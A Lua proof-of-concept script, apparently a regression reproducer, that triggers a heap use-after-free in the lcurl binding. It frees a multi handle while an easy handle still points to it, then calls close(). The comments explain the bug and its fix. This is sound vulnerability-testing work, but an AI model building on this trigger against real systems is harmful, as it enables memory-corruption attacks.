-- Lua-cURLv3 (lcurl) — cross-domain UAF: an easy handle's C-side back-pointer
-- to its multi handle (lcurl_easy_t::multi) dangles after the multi is GC'd.
--
-- Two distinct Lua-GC allocations:
--   1. the EASY userdata (holds the raw C pointer e->multi), and
--   2. the MULTI userdata (a separate object; its C struct lcurl_multi_t
--      wraps a native CURLM*).
-- add_handle() records the multi in the easy (e->multi = m) but nothing on the
-- Lua side keeps the multi reachable FROM the easy. So when the last Lua
-- reference to the multi is dropped, the GC collects the multi userdata while
-- the easy still holds e->multi.
--
-- On the vulnerable tree the multi's finalizer does NOT null the easies'
-- ->multi back-pointers, so e->multi is left dangling. The very next
-- easy:close() dereferences it (writes p->multi->L) -> heap-use-after-free.
-- The fix (56b4d05) walks the multi's handle table on close and nulls each
-- e->multi, so close() sees NULL and the finalizer is a no-op.

local curl = require('lcurl')

local e = curl.easy()
local m = curl.multi()
m:add_handle(e)              -- e->multi = m  (C back-pointer; GC-invisible)

m = nil                      -- drop the only Lua ref to the multi
collectgarbage(); collectgarbage()  -- collect + free the multi userdata; e->multi now dangles

e:close()                    -- vuln: writes p->multi->L into freed multi -> UAF

-- Reached only when e->multi was correctly nulled (fixed tree). run.sh treats
-- reaching here (with no ASan report) as the clean control half.
print('NO-UAF')
